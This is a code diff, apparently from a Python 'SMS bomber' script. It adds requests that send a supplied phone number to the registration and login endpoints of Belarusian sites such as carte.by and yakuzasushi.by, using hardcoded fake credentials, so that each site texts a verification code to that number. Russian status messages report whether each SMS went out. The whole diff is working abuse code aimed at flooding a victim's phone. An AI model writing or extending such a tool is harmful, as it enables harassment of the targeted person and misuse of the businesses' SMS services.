@@ -82,9 +82,38 @@ if response.status_code == 200:
 else:
     print('Смс от gippo-market не отправлено!')
     
-
+    
+    
 dates = {
-	"bxajaxid": "ajax",
-	"auth_action": "send_code_sms",
-	"PHONE": f"{phone}"
+	"ajax": "register",
+    "login": "morsik",
+    "pass": "123321123Eg",
+    "phone": f"{phone}",
+    "code": "",
+    "company": "0",
+    "resend": "1",
+    "checksum": "570"
 }
+
+response = requests.post('https://carte.by/auth/', data=dates, headers=headers1)
+
+if response.status_code == 200:
+    print("Смс от carte отправлено!")
+else:
+    print("Смс от carte не отправлено!")
+    
+    
+dates = {
+	"CSRF": "",
+    "ACTION": "REGISTER",
+    "MODE":	"PHONE",
+    "PHONE": f"{phone}",
+    "PASSWORD":	"123321123Eg",
+    "PASSWORD2": "123321123Eg"
+}
+
+response = requests.post('https://yakuzasushi.by/?action=auth', data=dates, headers=headers1)
+if response.status_code == 200:
+    print("Смс от yakuzasushi отправлено!")
+else:
+    print("Смс от yakuzasushi не отправлено!")
